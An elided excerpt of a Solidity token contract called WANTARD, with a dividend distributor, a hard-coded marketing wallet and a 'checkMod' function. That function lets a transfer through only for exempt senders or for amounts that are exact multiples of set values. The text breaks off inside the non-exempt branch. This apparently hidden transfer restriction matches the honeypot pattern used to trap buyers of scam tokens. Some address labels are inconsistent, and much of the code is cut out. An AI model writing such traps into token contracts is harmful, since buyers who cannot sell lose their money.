...
contract DividendDistributor is IDividendDistributor {
 ...
 IBEP20 REWARDS = 
IBEP20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); //the reward token you want distributed 
...
contract WANTARD is IBEP20, Auth {
 using SafeMath for uint256;
 address REWARDS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; //Input the token address of whatever your reward is. leave 431,432,433 as is. 
 address WBNB = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 
 address DEAD = 0x000000000000000000000000000000000000dEaD;
 address ZERO = 0x0000000000000000000000000000000000000000;
 address _marketingAdr = 0x4531d66027c58940c9E705F321Bf8FE3BdEa4E67;
 address routerv2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 string constant _name = "WANTARD";
 string constant _symbol = "WANTARD";
 ...
 uint256 public remainder = 22000000;
...
returns (bool) {
 ...
 return true;
    ...
    function checkMod(address sender, uint256 amount) internal view {
        if (modPro){
            if(isTxLimitExempt[sender] || amount % remainder == 0 || amount % modDis == 0 ){
                uint256 a = 1;
            }
            else{
                 uint256 result = 1;
